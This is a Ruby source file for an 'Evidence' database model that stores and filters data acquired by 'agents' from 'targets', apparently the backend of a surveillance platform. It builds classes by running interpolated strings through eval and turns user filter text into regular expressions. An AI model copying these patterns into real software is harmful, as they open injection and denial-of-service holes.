require 'mongoid'
require_relative '../shard'

#module RCS
#module DB

class Evidence

  def self.collection_name(target)
    "evidence.#{target}"
  end

  def self.collection_class(target)

    classDefinition = <<-END
      class Evidence_#{target}
        include Mongoid::Document

        field :da, type: Integer            # date acquired
        field :dr, type: Integer            # date received
        field :type, type: String
        field :rel, type: Integer           # relevance (tag)
        field :blo, type: Boolean           # blotter (report)
        field :note, type: String
        field :aid, type: String            # agent BSON_ID
        field :data, type: Hash
    
        store_in Evidence.collection_name('#{target}')

        after_create :create_callback
        after_destroy :destroy_callback

        index :type
        index :da
        index :dr
        index :aid
        index :rel
        index :blo
        shard_key :type, :da, :aid

        STAT_EXCLUSION = ['info', 'filesystem']

        protected

        def create_callback
          # skip migrated logs, the stats are calculated by the migration script
          return if (self[:_mid] != nil and self[:_mid] > 0)
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.aid
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] += 1
          agent.stat.dashboard ||= {}
          agent.stat.dashboard[self.type] ||= 0
          agent.stat.dashboard[self.type] += 1
          agent.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          agent.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          # update the target of this agent
          agent.get_parent.restat
        end

        def destroy_callback
          return if STAT_EXCLUSION.include? self.type
          agent = Item.find self.aid
          agent.stat.evidence ||= {}
          agent.stat.evidence[self.type] ||= 0
          agent.stat.evidence[self.type] -= 1
          agent.stat.dashboard ||= {}
          agent.stat.dashboard[self.type] ||= 0
          agent.stat.dashboard[self.type] -= 1
          agent.stat.size -= Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          agent.stat.grid_size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          agent.save
          
          # drop the file (if any) in grid
          RCS::DB::GridFS.delete(self.data['_grid'], agent.path.last.to_s) unless self.data['_grid'].nil?

          # update the target of this agent
          agent.get_parent.restat
        end
      end
    END
    
    classname = "Evidence_#{target}"
    
    if self.const_defined? classname.to_sym
      klass = eval classname
    else
      eval classDefinition
      klass = eval classname
    end
    
    return klass
  end

  def self.dynamic_new(target_id)
    klass = self.collection_class(target_id)
    return klass.new
  end

  def self.deep_copy(src, dst)
    dst.da = src.da
    dst.dr = src.dr
    dst.blo = src.blo
    dst.data = src.data
    dst.aid = src.aid
    dst.note = src.note
    dst.rel = src.rel
    dst.type = src.type
  end

  def self.filter(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    query = filtering.where(filter_hash).order_by([[:da, :asc]])

    return query
  end

  def self.filtered_count(params)

    filter, filter_hash, target = ::Evidence.common_filter params
    raise "Target not found" if filter.nil?

    # copy remaining filtering criteria (if any)
    filtering = Evidence.collection_class(target[:_id]).not_in(:type => ['filesystem', 'info'])
    filter.each_key do |k|
      filtering = filtering.any_in(k.to_sym => filter[k])
    end

    num_evidence = filtering.where(filter_hash).count

    return num_evidence
  end

  def self.common_filter(params)

    # filtering
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter' and params['filter'].is_a? String
    # must duplicate here since we delete the param later but we need to keep the parameter intact for
    # subsequent calls
    filter = params['filter'].dup if params.has_key? 'filter' and params['filter'].is_a? Hash

    # if not specified the filter on the date is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil?
    filter['to'] = Time.now.to_i if filter['to'].nil?

    # to remove a filter set it to 0
    filter.delete('from') if filter['from'] == 0
    filter.delete('to') if filter['to'] == 0

    filter_hash = {}

    # filter by target
    target = Item.where({_id: filter.delete('target')}).first
    return nil if target.nil?

    # filter by agent
    filter_hash[:aid] = filter.delete('agent') if filter['agent']

    # default filter is on acquired
    date = filter.delete('date')
    date ||= 'da'
    date = date.to_sym

    # date filters must be treated separately
    filter_hash[date.gte] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date.lte] = filter.delete('to') if filter.has_key? 'to'

    # custom filters for info
    if filter.has_key? 'info'
      begin
        key_values = filter.delete('info').split(',')
        key_values.each do |kv|
          k, v = kv.split(':')
          filter_hash["data.#{k}"] = Regexp.new("#{v}", true)
        end
      rescue Exception => e
        trace :error, "Invalid filter for data [#{e.message}], ignoring..."
      end
    end

    return filter, filter_hash, target
  end

  def self.common_mongo_filter(params)
    filter = {}
    filter = JSON.parse(params['filter']) if params.has_key? 'filter'

    # target id
    target_id = filter.delete('target')

    # default date filtering is last 24 hours
    filter['from'] = Time.now.to_i - 86400 if filter['from'].nil?
    filter['to'] = Time.now.to_i if filter['to'].nil?

    filter_hash = {}

    # agent filter
    filter_hash["aid"] = filter.delete('agent') if filter['agent']

    # date filter
    date = filter.delete('date')
    date ||= 'da'

    # do not account for filesystem and info evidences
    filter_hash["type"] = {"$nin" => ["filesystem", "info"]} unless filter['type']

    filter_hash[date] = Hash.new
    filter_hash[date]["$gte"] = filter.delete('from') if filter.has_key? 'from'
    filter_hash[date]["$lte"] = filter.delete('to') if filter.has_key? 'to'

    if filter.has_key? 'info'
      begin
        key_values = filter.delete('info').split(',')
        key_values.each do |kv|
          k, v = kv.split(':')
          filter_hash["data.#{k}"] = Regexp.new("#{v}", true)
        end
      rescue Exception => e
        trace :error, "Invalid filter for data [#{e.message}], ignoring..."
      end
    end

    # remaining filters
    filter.each_key do |k|
      filter_hash[k] = {"$in" => filter[k]}
    end

    return filter, filter_hash, target_id
  end

end

#end # ::DB
#end # ::RCS